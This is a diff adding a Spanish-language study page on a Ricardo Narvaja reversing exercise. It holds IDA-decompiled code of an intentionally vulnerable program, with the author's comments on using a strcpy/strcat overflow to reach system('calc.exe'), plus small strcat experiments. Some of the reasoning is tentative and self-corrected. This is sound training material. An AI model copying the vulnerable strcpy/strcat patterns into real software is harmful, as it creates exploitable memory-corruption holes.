@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Ricardo Narvaja Reversing: Buffer overflow examen 9 | Index</title>
+<meta name="robots" content='index, follow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://adityatelange.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://adityatelange.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://adityatelange.github.io/">
+      <img src="https://adityatelange.github.io/index.png" alt="Index">
+      <span>Index</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://adityatelange.github.io/buffer_overflow_9/">
+      <span>Ricardo Narvaja Reversing: Buffer overflow examen 9</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://adityatelange.github.io/@ricardo/">Ricardo</a></li>
+  
+  <li><a href="https://adityatelange.github.io/@narvaja/">Narvaja</a></li>
+  
+  <li><a href="https://adityatelange.github.io/@reversing/">Reversing</a></li>
+  
+  <li><a href="https://adityatelange.github.io/@examen/">Examen</a></li>
+  
+  <li><a href="https://adityatelange.github.io/@ida/">Ida</a></li>
+  
+</ul>
+
+<div class="content"><h3 id="este-reto-usa-vfprintf">Este reto usa vfprintf</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdarg.h&gt;                                                             </span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;                                                              </span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>                                                                                
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vout</span><span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...);</span>                                        
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">fmt1</span> <span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;%s  %s  %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>                                                  
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>                                                                  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>                                                                               
+</span></span><span class="line"><span class="cl">   <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span>                                                                
+</span></span><span class="line"><span class="cl">   <span class="n">stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;myfile.dat&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>                                           
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl">   <span class="nf">vout</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">fmt1</span><span class="p">,</span> <span class="s">&#34;Sat&#34;</span><span class="p">,</span> <span class="s">&#34;Sun&#34;</span><span class="p">,</span> <span class="s">&#34;Mon&#34;</span><span class="p">);</span>                                     
+</span></span><span class="line"><span class="cl"><span class="p">}</span>                                                                               
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vout</span><span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>                                         
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl"><span class="p">{</span>                                                                               
+</span></span><span class="line"><span class="cl">   <span class="n">va_list</span> <span class="n">arg_ptr</span><span class="p">;</span>                                                             
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl">   <span class="nf">va_start</span><span class="p">(</span><span class="n">arg_ptr</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>                                                      
+</span></span><span class="line"><span class="cl">   <span class="nf">vfprintf</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">arg_ptr</span><span class="p">);</span>                                              
+</span></span><span class="line"><span class="cl">   <span class="nf">va_end</span><span class="p">(</span><span class="n">arg_ptr</span><span class="p">);</span>                                                             
+</span></span><span class="line"><span class="cl"><span class="p">}</span>                                                                               
+</span></span></code></pre></div><p>printf que me decompilo el ida:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">printf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">Format</span><span class="p">,</span> <span class="p">...)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">va_list</span> <span class="n">va</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp+Ch] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">va_start</span><span class="p">(</span><span class="n">va</span><span class="p">,</span> <span class="n">Format</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">sub_401000</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">_acrt_iob_func</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">vfprintf</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="n">Format</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">va</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="esto-me-generó-el-ida-con-algunos-retoques">Esto me generó el IDA con algunos retoques:</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Overfloodea cuando cargo el caracter 169
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="nf">this_106</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">this</span><span class="p">[</span><span class="mi">106</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;A ejecutar la calculadora de nuevo...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// De acá tenés que saltar a Destination[4] == &#39;Q&#39; 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="n">this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">check_0</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Concatena(une) la cadena Destination con la posición 106 de la cadena destination
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Estas siguientes expresiones son equivalentes.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *(Destination+100) = Destination[100]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// NO está concatenandolo con Destination+106, lo está concatenando con sólo un byte
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// strcat espera un puntero como 1er y 2do argumento, acá le pasan es una posición del buffer, o sea le estás pasando la posición de memoria de donde querés que lea, podemos apuntar Destination[106] a cualquier lado
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">strcat</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">106</span><span class="p">]);</span> <span class="c1">// Supuestamente le agrega 1 byte que es el byte modificado por la función this_106, en realidad esto rompe todo. Todo lo que está abajo no se ejecutará.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Compara si el valor del tamaño del buffer Destination vale 56 bytes.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Este if nunca será verdadero porque no existe el caracter nulo porque strcat lo eliminó, por lo tanto tenemos que pisar el return address y saltar a if Destination[4] == &#39;Q&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// ME EQUIVOQUÉ SI ES VERDADERO AUNQUE ES RARISIMO PORQUE this[106] sólo debería permitirme cargar 1 byte y en Linux con gcc todo lo que está debajo del strcat no se ejecuta.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Destination</span><span class="p">)</span> <span class="o">==</span> <span class="mi">56</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;I&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Si lo es llama a printf e imprime la cadena a partir de la posición 254 para adelante.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">52</span><span class="p">)</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">// Esto 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">52</span><span class="p">))(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// es lo mismo que :
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">printf</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Lo mismo con los demás, sólo imprime texto.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;P&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">53</span><span class="p">)</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">53</span><span class="p">))(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;Q&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// a2 = system. system(Destination+254) acá llama a system y pasa como argumento cualquier cosa que hay después de Destination+254. Entonces tenemos que pisar esa dirección con &#34;calc.exe&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">54</span><span class="p">)</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// a2 es un puntero a system
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Tenemos que hacer una llamada como:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// system(&#34;calc.exe&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Esto
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">54</span><span class="p">))(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Es lo mismo que 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">system</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Destination + 254 = hace referencia al buffer, si miramos en el ida en la pila del stack, para llegar al buffer necesitamos 25 bytes más es decir: Destination+225 = buffer, lo podemos comprobar mirando la pila de la variable botón derecho array y dándole 224 bytes hasta que el buffer queda abajo. Destination[225] = Buffer[0] 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// 54-25 = 29 entonces Destination[254] = Buffer[29] entonces buffer[29] = &#34;calc.exe&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;R&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">55</span><span class="p">)</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">55</span><span class="p">))(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">check</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// v7 pasa a ser a2 en esta función
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// a2 es un puntero a system, ¿como hacemos para que se ejecute la calculadora?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">check_0</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">Destination</span><span class="p">[</span><span class="mi">56</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-1B0h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">Buffer</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span> <span class="c1">// [esp+E0h] [ebp-D0h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+1A8h] [ebp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp+1ACh] [ebp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">this_106</span><span class="p">(</span><span class="n">Destination</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Destination</span><span class="p">[</span><span class="mi">52</span><span class="p">]</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">200u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Empieza a leer el contenido del archivo y lo carga a partir de la posición 51
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">Destination</span><span class="p">[</span><span class="mi">51</span><span class="p">]</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;example.txt&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">Destination</span><span class="p">[</span><span class="mi">51</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">Destination</span><span class="p">[</span><span class="mi">52</span><span class="p">])(</span><span class="s">&#34;No se puede leer el archivo bye bye </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// De destination lo carga a buffer 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">fread</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">200u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">51</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// y de buffer a destination otra vez.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">strcpy</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="n">Buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Verifica si la posición 0 del buffer vale 0, es decir hay que desbordarla para pisar esa parte.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="nf">SLOBYTE</span><span class="p">(</span><span class="n">Destination</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">&#39;0&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">system</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">check</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="n">Destination</span><span class="p">[</span><span class="mi">52</span><span class="p">])(</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">30</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="pequeño-estudio-de-lo-que-pasa-cuando-usamos-strcat-con-una-posición-de-un-buffer">Pequeño estudio de lo que pasa cuando usamos strcat con una posición de un buffer</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">prueba</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">&#39;h&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39;\0&#39;</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">strcat</span><span class="p">(</span><span class="n">prueba</span><span class="p">,</span><span class="n">prueba</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Lo que hará será transformar &#39;a&#39; a hexadecimal que es 61. Entonces va a puntar a 0x61 va a concatenar prueba con lo que sea que está en la posición de memoria 0x61 (o sea nada).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;prueba: %x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">prueba</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="otro-pequeño-estudio-de-strcat">Otro pequeño estudio de strcat</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">prueba</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">&#39;h&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39; &#39;</span><span class="p">,</span><span class="sc">&#39;\0&#39;</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Estas expresiones son equivalentes
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">char</span> <span class="n">asdf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;mundo</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">asdf1</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">&#39;m&#39;</span><span class="p">,</span><span class="sc">&#39;u&#39;</span><span class="p">,</span><span class="sc">&#39;n&#39;</span><span class="p">,</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;\n&#39;</span><span class="p">,</span><span class="sc">&#39;\0&#39;</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// strcat borra el caracter nulo del 1er argumento, entonces cuando vos concatenás con un caracter estás borrando el caracter nulo del primer argumento y lo dejás sin fin de cadena, eso hace que el strlen no funcione porque no encuentra el fin de cadena.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">strcat</span><span class="p">(</span><span class="n">prueba</span><span class="p">,</span><span class="n">asdf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1">// Lo que hará será transformar &#39;a&#39; a hexadecimal que es 61. Entonces va a puntar a 0x61 va a concatenar prueba con lo que sea que está en la posición de memoria 0x61 (o sea nada).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;prueba: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">prueba</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="implementación-de-strcat-en-c">Implementación de strcat en C</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span> <span class="nf">strcat</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">dest</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">src</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dest</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dest</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">dest</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="implementación-de-strlen-en-c">Implementación de strlen en C</h3>
